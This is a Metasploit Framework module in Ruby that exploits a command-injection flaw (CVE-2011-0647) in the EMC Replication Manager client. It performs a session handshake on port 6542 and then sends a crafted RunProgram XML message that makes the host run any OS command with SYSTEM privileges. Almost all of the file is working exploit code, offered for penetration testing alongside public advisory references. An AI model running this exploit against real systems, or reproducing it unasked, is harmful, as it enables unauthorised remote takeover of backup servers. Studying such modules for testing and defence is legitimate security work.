##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'EMC Replication Manager Command Execution',
			'Description'    => %q{
				This module exploit a remote command-injection vulnerability in EMC Replication
				Manager client (irccd.exe). By sending a specially crafted message invoking RunProgram
				function an attacker may be able to execute arbitrary code commands with SYSTEM privileges.
				Affected products is EMC Replication Manager < 5.3.
				This module has been successfully tested against EMC Replication Manager 5.2.1 on W2003.
				EMC Networker Module for Microsoft Applications 2.1 and 2.2 may be vulnerable too although
				this module have not been tested against these products.

			},
			'Author'         =>
				[
					'Anonymous',					#Initial discovery
					'Davy Douhine',						#MSF module
				],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'CVE', '2011-0647' ],
					[ 'OSVDB', '70853' ],
					[ 'BID', '46235' ],
					[ 'URL', 'http://www.securityfocus.com/archive/1/516260' ],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-11-061/' ],
				],
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', { } ]
				],
			'DefaultTarget'  => 0,
			'Privileged'     => true,
			))

		register_options(
			[
				Opt::RPORT(6542),
				OptString.new('CMD', [true, 'The OS command to execute', 'c:\\windows\\system32\\calc.exe']),
			], self.class)
	end

	def run
		connect

		print_status("We send hello...")
		hello = "1HELLOEMC00000000000000000000000"
		sock.put(hello)
		result = sock.get_once || ''
		if result and result =~ /RAWHELLO/
				print_good("We get hello back for the server. Good")
				else
					disconnect
					return :fail
		end

		print_status("We send ClientStartSession...")
		startsession = "EMC_Len0000000136<?xml version=\"1.0\" encoding=\"UTF-8\"?><ir_message ir_sessionId=0000 ir_type=\"ClientStartSession\" <ir_version>1</ir_version></ir_message>"
		sock.put(startsession)
		result = sock.get_once || ''
		if result and result =~ /EMC/
				print_good("A session has been created. Good.")
				else
					disconnect
					return :fail
		end

		sleep (6)

		cmd = datastore['CMD']
		print_status("Using RunProgram function we ask the host to run: \"#{cmd}\"")
		runprog = "<?xml version=\"1.0\" encoding=\"UTF-8\"?> "
		runprog << "<ir_message ir_sessionId=\"01111\" ir_requestId=\"00000\" ir_type=\"RunProgram\" ir_status=\"0\"><ir_runProgramCommand>#{cmd}</ir_runProgramCommand>"
		runprog << "<ir_runProgramAppInfo>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;ir_message ir_sessionId=&quot;00000&quot; ir_requestId=&quot;00000&quot; "
		runprog << "ir_type=&quot;App Info&quot; ir_status=&quot;0&quot;&gt;&lt;IR_groupEntry IR_groupType=&quot;anywriter&quot;  IR_groupName=&quot;CM1109A1&quot;  IR_groupId=&quot;1&quot; "
		runprog << "&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?	&amp;gt; &amp;lt;ir_message ir_sessionId=&amp;quot;00000&amp;quot; "
		runprog << "ir_requestId=&amp;quot;00000&amp;quot;ir_type=&amp;quot;App Info&amp;quot; ir_status=&amp;quot;0&amp;quot;&amp;gt;&amp;lt;aa_anywriter_ccr_node&amp;gt;CM1109A1"
		runprog << "&amp;lt;/aa_anywriter_ccr_node&amp;gt;&amp;lt;aa_anywriter_fail_1018&amp;gt;0&amp;lt;/aa_anywriter_fail_1018&amp;gt;&amp;lt;aa_anywriter_fail_1019&amp;gt;0"
		runprog << "&amp;lt;/aa_anywriter_fail_1019&amp;gt;&amp;lt;aa_anywriter_fail_1022&amp;gt;0&amp;lt;/aa_anywriter_fail_1022&amp;gt;&amp;lt;aa_anywriter_runeseutil&amp;gt;1"
		runprog << "&amp;lt;/aa_anywriter_runeseutil&amp;gt;&amp;lt;aa_anywriter_ccr_role&amp;gt;2&amp;lt;/aa_anywriter_ccr_role&amp;gt;&amp;lt;aa_anywriter_prescript&amp;gt;"
		runprog << "&amp;lt;/aa_anywriter_prescript&amp;gt;&amp;lt;aa_anywriter_postscript&amp;gt;&amp;lt;/aa_anywriter_postscript&amp;gt;&amp;lt;aa_anywriter_backuptype&amp;gt;1"
		runprog << "&amp;lt;/aa_anywriter_backuptype&amp;gt;&amp;lt;aa_anywriter_fail_447&amp;gt;0&amp;lt;/aa_anywriter_fail_447&amp;gt;&amp;lt;aa_anywriter_fail_448&amp;gt;0"
		runprog << "&amp;lt;/aa_anywriter_fail_448&amp;gt;&amp;lt;aa_exchange_ignore_all&amp;gt;0&amp;lt;/aa_exchange_ignore_all&amp;gt;&amp;lt;aa_anywriter_sthread_eseutil&amp;gt;0&amp"
		runprog << ";lt;/aa_anywriter_sthread_eseutil&amp;gt;&amp;lt;aa_anywriter_required_logs&amp;gt;0&amp;lt;/aa_anywriter_required_logs&amp;gt;&amp;lt;aa_anywriter_required_logs_path"
		runprog << "&amp;gt;&amp;lt;/aa_anywriter_required_logs_path&amp;gt;&amp;lt;aa_anywriter_throttle&amp;gt;1&amp;lt;/aa_anywriter_throttle&amp;gt;&amp;lt;aa_anywriter_throttle_ios&amp;gt;300"
		runprog << "&amp;lt;/aa_anywriter_throttle_ios&amp;gt;&amp;lt;aa_anywriter_throttle_dur&amp;gt;1000&amp;lt;/aa_anywriter_throttle_dur&amp;gt;&amp;lt;aa_backup_username&amp;gt;"
		runprog << "&amp;lt;/aa_backup_username&amp;gt;&amp;lt;aa_backup_password&amp;gt;&amp;lt;/aa_backup_password&amp;gt;&amp;lt;aa_exchange_checksince&amp;gt;1335208339"
		runprog << "&amp;lt;/aa_exchange_checksince&amp;gt; &amp;lt;/ir_message&amp;gt;&lt;/IR_groupEntry&gt; &lt;/ir_message&gt;</ir_runProgramAppInfo>"
		runprog << "<ir_applicationType>anywriter</ir_applicationType><ir_runProgramType>backup</ir_runProgramType> </ir_message>"
		emclength = "EMC_Len000000";
		runpacket = emclength + runprog.length.to_s + runprog
		sock.put(runpacket)

		sleep (6)

		endstring = "B" * 32
		sock.put(endstring)
		result = sock.get_once || ''
		if result and result =~ /exists and has read privilege/
			print_good("Command has been executed !")
			else
				print_error("Command has not been executed.")
				print_error("Replication Manager sent back: \"#{result}\"")
				return :fail
		end
		disconnect

	end

end
